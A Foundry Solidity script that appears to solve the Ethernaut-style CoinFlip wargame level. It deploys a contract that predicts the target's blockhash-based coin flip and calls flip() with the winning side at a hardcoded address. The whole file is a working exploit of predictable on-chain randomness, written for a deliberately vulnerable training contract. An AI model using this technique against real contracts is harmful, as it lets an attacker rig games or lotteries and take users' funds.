// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "../src/03_CoinFlip.sol";
import {Script, console} from "forge-std/Script.sol";

contract CoinFlipSolve is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Flip();
        vm.stopBroadcast();
    }
}

contract Flip {
    CoinFlip coin = CoinFlip(0xFFD66Aa38d461249C0115e349fBaC487f0f9f782);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coin.flip(side);
        console.log("ConsecutiveWins#", coin.consecutiveWins());
    }
}
